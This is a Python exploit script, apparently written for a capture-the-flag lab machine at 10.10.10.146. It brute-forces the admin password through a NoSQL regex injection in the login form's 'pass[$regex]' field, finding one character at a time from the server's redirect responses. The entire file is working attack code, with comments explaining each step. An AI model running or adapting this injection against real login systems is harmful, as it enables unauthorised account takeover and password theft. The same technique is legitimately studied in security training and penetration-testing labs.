#imports
import requests
import string

def main():
    # URL of the website that we are attacking
    url = "http://10.10.10.146"

    # Creating our alphabet of characters to test
    alpha = string.digits + string.ascii_letters
    pwLen = 25 #this is the length of the password

    #creating an empty string to assemble our new password
    key_pw = ''

    # For loop for checking characters 
    for i in range(pwLen):
        print(f"Finding character at position: {i + 1}")
        
        for c in alpha:
            #escaping regex
            if c in '.*+?^${}()|[]\\':
                c = '\\' + c
            # Regex to try current character at the current I position
            reg = f"^{key_pw}{c}" #establashing the regex pattern

            # data sent via form-data, exploits the pass[$regex] 
            data = {'username': 'admin', 'pass[$regex]': reg}

            # Sends the request using the requests lib 
            r = requests.post(url, data=data, allow_redirects=False)

            # Checks if the header 'Location' is present and contains no errors
            if 'Location' in r.headers and "err" not in r.headers['Location']:
                key_pw += c
                print(f"Found Character: {c}\n")
                break
        if len(key_pw) != i + 1:
            print("Could not find next character, ending attempt...")
            break
    if len(key_pw) == pwLen:
        print(f"Password found: {key_pw}")
    else:
        print(f"Partial password found: {key_pw}")
main()
